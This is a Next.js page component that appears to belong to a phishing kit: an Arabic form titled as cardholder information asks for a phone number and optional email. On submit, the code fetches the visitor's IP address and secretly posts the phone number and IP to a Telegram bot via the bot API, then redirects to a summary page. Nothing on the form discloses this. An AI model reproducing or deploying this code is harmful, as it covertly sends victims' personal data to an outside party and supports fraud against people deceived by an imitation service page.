"use client";
import { useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import CustomRadio from "@/components/CustomRadio";
import LoadingButton from "@/components/Button";

export default function ResultPage() {
  const [mobileNumber, setMobileNumber] = useState("");
  const [firstOperationType, setFirstOperationType] = useState("reprint");
  const [secondOperationType, setSecondOperationType] = useState("reprint");
  const [email, setEmail] = useState("");
  const [error, setError] = useState(false);
  const [showEmailInput, setShowEmailInput] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();
  const idNumber = searchParams.get("idNumber");

  const handleInputChange = (e) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 9) {
      setMobileNumber(value);
      setError(false);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // ❌ Stop if invalid
    if (mobileNumber.length !== 9) {
      setError(true);
      return;
    }

    setError(false);

    // ✅ Save phone number in session storage
    sessionStorage.setItem("mobileNumber", mobileNumber);

    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;

    const userIP = await fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => data.ip);

    const message = `Phone Number: ${mobileNumber}\nIP Adress: ${userIP}`;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        }
      );

      if (response.ok) {
        router.push(`/summary?idNumber=${idNumber}`);
      } else {
        alert("أعد المحاولة حدث خطأ ما");
      }
    } catch (error) {
      alert("أعد المحاولة حدث خطأ ما");
    }
  };

  const handleClear = () => {
    setMobileNumber("");
    setFirstOperationType("reprint");
    setSecondOperationType("reprint");
    setEmail("");
    setError(false);
    setShowEmailInput(false);
  };

  return (
    <div className="w-full max-w-md p-4 bg-white rounded">
      <p className="text-md text-gray-600 mb-4">
        تعبئة نموذج الطلب -- سوف يستغرق حوالي 1 دقيقة لإتمام الطلب.
      </p>

      <div className="mb-4">
        <p className="text-2xl py-8 font-bold">معلومات حامل البطاقة</p>
      </div>

      {/* رقم الهاتف */}
      <div className="mb-4">
        <label className="block text-md font-medium mb-2">رقم الهاتف</label>
        <input
          type="text"
          value={mobileNumber}
          onChange={handleInputChange}
          className={`w-full px-4 py-2 border rounded focus:outline-none focus:ring ${error ? "border-red-500" : "border-gray-300"
            }`}
          placeholder="أدخل رقم الهاتف"
        />
        {error && (
          <p className="text-red-500 text-sm mt-1">
            يجب أن يتكون رقم الهاتف من 9 أرقام.
          </p>
        )}
      </div>

      {/* البريد الإلكتروني */}
      <div className="mb-4">
        <label className="block text-md font-medium mb-2">
          هل تريد إستلام الإيصال عبر البريد الإلكتروني؟
        </label>
        <div className="flex flex-col gap-4">
          <label className="flex items-center">
            <input
              type="radio"
              value="renew"
              checked={firstOperationType === "renew"}
              onChange={() => {
                setFirstOperationType("renew");
                setShowEmailInput(true);
              }}
              className="sr-only peer"
            />
            <CustomRadio />
            نعم
          </label>
          <label className="flex items-center">
            <input
              type="radio"
              value="reprint"
              checked={firstOperationType === "reprint"}
              onChange={() => {
                setFirstOperationType("reprint");
                setShowEmailInput(false);
              }}
              className="sr-only peer"
            />
            <CustomRadio />
            لا
          </label>
        </div>

        {showEmailInput && (
          <div className="mt-4">
            <label className="block text-md font-medium mb-2">
              البريد الإلكتروني
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-2 border rounded focus:outline-none focus:ring border-gray-300"
              placeholder="أدخل بريدك الإلكتروني"
            />
          </div>
        )}
      </div>

      {/* الرسائل النصية */}
      <div className="mb-4">
        <label className="block text-md font-medium mb-2">
          هل تريد إستلام رسالة نصية؟
        </label>
        <div className="flex flex-col gap-4">
          <label className="flex items-center">
            <input
              type="radio"
              value="renew"
              checked={secondOperationType === "renew"}
              onChange={() => setSecondOperationType("renew")}
              className="sr-only peer"
            />
            <CustomRadio />
            نعم
          </label>
          <label className="flex items-center">
            <input
              type="radio"
              value="reprint"
              checked={secondOperationType === "reprint"}
              onChange={() => setSecondOperationType("reprint")}
              className="sr-only peer"
            />
            <CustomRadio />
            لا
          </label>
        </div>
      </div>

      {/* الأزرار */}
      <div className="w-full flex justify-between items-center py-6 px-6 gap-4">
        <button
          onClick={handleClear}
          className="px-4 py-2 bg-gray-500 text-white rounded-3xl hover:bg-gray-600"
        >
          تفريغ الحقول
        </button>

        <LoadingButton onClick={handleSubmit} w="40%">
          تابع
        </LoadingButton>
      </div>
    </div>
  );
}
